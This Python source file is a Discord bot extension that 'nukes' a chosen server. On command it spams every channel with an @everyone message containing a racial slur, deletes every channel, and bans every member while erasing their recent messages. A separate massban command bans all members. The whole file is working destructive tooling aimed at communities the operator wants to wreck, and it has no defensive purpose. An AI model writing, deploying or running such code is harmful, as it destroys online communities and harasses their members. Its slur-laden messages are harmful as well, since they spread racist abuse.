import discord
from discord.ext import commands
import asyncio


class NukeCog(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.allowed_users = [123456789012345678]

    async def cog_check(self, ctx) -> bool:
        return ctx.author.id in self.allowed_users

    @commands.command(name="nuke")
    async def nuke(self, ctx, server_id: int):
        if ctx.guild:
            await ctx.send("Use this command in DMs. Usage: !nuke <server_id>")
            return

        guild = self.bot.get_guild(server_id)
        if not guild:
            await ctx.send(f"Bot is not in server with ID: {server_id}")
            return

        await ctx.send(f"Target: {guild.name} ({len(guild.members)} members, {len(guild.channels)} channels)\nType !confirm to proceed. Timeout: 30 seconds")

        def check(m):
            return m.author == ctx.author and m.content == "!confirm"

        try:
            await self.bot.wait_for('message', check=check, timeout=30.0)
        except asyncio.TimeoutError:
            await ctx.send("Nuke cancelled.")
            return

        await ctx.send(f"Starting nuke on {guild.name}...")

        msg = "get nuked niggas @everyone"

        for channel in list(guild.text_channels):
            try:
                await channel.send(msg, allowed_mentions=discord.AllowedMentions(everyone=True))
                await asyncio.sleep(0.2)
            except:
                pass

        channels_deleted = 0
        for channel in list(guild.channels):
            try:
                await channel.delete(reason="Nuked")
                channels_deleted += 1
                await asyncio.sleep(0.5)
            except:
                pass

        await ctx.send(f"Deleted {channels_deleted} channels")

        members_banned = 0
        for member in list(guild.members):
            if member == guild.me or member.id == ctx.author.id:
                continue
            try:
                await member.ban(reason="Nuked", delete_message_days=7)
                members_banned += 1
                await asyncio.sleep(0.5)
            except:
                pass

        await ctx.send(f"Banned {members_banned} members")

        try:
            final = await guild.create_text_channel("nuked")
            await final.send(msg, allowed_mentions=discord.AllowedMentions(everyone=True))
        except:
            pass

        await ctx.send(f"Nuke complete on {guild.name}")

    @commands.command(name="massban")
    async def massban(self, ctx, server_id: int):
        if ctx.guild:
            await ctx.send("Use from DMs: !massban <server_id>")
            return

        guild = self.bot.get_guild(server_id)
        if not guild:
            await ctx.send("Server not found")
            return

        await ctx.send(f"Banning all members from {guild.name}...")

        banned = 0
        for member in list(guild.members):
            if member == self.bot.user or member.id == ctx.author.id:
                continue
            try:
                await member.ban(reason="Mass ban", delete_message_days=7)
                banned += 1
                await asyncio.sleep(0.5)
            except:
                pass

        await ctx.send(f"Banned {banned} members from {guild.name}")

    @nuke.error
    @massban.error
    async def nuke_error(self, ctx, error):
        if isinstance(error, commands.CheckFailure):
            await ctx.send("Not authorized.")
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.send("Usage: !nuke <server_id>")
        else:
            await ctx.send(f"Error: {error}")


async def setup(bot: commands.Bot):
    await bot.add_cog(NukeCog(bot))
